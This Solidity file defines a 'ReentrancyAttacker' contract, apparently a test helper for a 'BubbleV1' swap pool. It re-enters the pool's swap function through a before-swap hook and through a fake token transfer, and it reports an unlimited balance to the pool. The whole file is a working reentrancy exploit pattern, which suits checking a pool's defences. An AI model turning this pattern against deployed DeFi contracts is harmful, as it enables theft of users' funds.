// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IBubbleV1Callee } from "@src/interfaces/IBubbleV1Callee.sol";
import { IBubbleV1Pool } from "@src/interfaces/IBubbleV1Pool.sol";
import { BubbleV1Types } from "@src/library/BubbleV1Types.sol";

contract ReentrancyAttacker is IBubbleV1Callee {
    address public immutable targetPool;
    address public immutable tokenA;
    address public immutable tokenB;
    uint256 public reentrancyDepth;
    uint256 public maxDepth;

    constructor(address _pool, uint256 _maxDepth) {
        targetPool = _pool;
        (tokenA, tokenB) = IBubbleV1Pool(_pool).getPoolTokens();
        maxDepth = _maxDepth;
    }

    // Entry point for the attack
    function startAttack(uint256 amountOut) external {
        // Prepare malicious swap parameters
        BubbleV1Types.SwapParams memory params = BubbleV1Types.SwapParams({
            amountAOut: tokenA == address(this) ? amountOut : 0,
            amountBOut: tokenB == address(this) ? amountOut : 0,
            receiver: address(this),
            hookConfig: BubbleV1Types.HookConfig({
                hookBeforeCall: true, // We want to reenter in the before call
                hookAfterCall: false
            }),
            data: abi.encode(amountOut)
        });

        // Trigger the vulnerable swap
        IBubbleV1Pool(targetPool).swap(params);
    }

    // ==============================================
    // IBubbleV1Callee Interface Implementation
    // ==============================================

    function hookBeforeCall(
        address sender,
        uint256 amountAOut,
        uint256 amountBOut,
        bytes calldata data
    )
        external
        override
    {
        require(msg.sender == targetPool, "Unauthorized callback");

        if (reentrancyDepth < maxDepth) {
            reentrancyDepth++;

            // Decode the original attack amount
            uint256 amountOut = abi.decode(data, (uint256));

            // Prepare new attack params
            BubbleV1Types.SwapParams memory newParams = BubbleV1Types.SwapParams({
                amountAOut: tokenA == address(this) ? amountOut : 0,
                amountBOut: tokenB == address(this) ? amountOut : 0,
                receiver: address(this),
                hookConfig: BubbleV1Types.HookConfig({ hookBeforeCall: true, hookAfterCall: false }),
                data: data
            });

            // Reenter!
            IBubbleV1Pool(targetPool).swap(newParams);
        }
    }

    function hookAfterCall(
        address sender,
        uint256 amountAOut,
        uint256 amountBOut,
        bytes calldata data
    )
        external
        override
    {
        // Not used in this attack
    }

    function onCall(
        address sender,
        uint256 amountAOut,
        uint256 amountBOut,
        bytes calldata data
    )
        external
        override
    {
        // Not used in this attack
    }

    // ==============================================
    // Malicious Token Implementation
    // ==============================================

    // If this contract pretends to be a token, this would be called during transfers
    function transfer(address to, uint256 amount) external returns (bool) {
        if (reentrancyDepth < maxDepth && msg.sender == targetPool) {
            // Reenter during token transfer
            this.startAttack(amount);
        }
        return true;
    }

    // Needed for token balance checks
    function balanceOf(address account) external view returns (uint256) {
        return account == targetPool ? type(uint256).max : 0;
    }
}
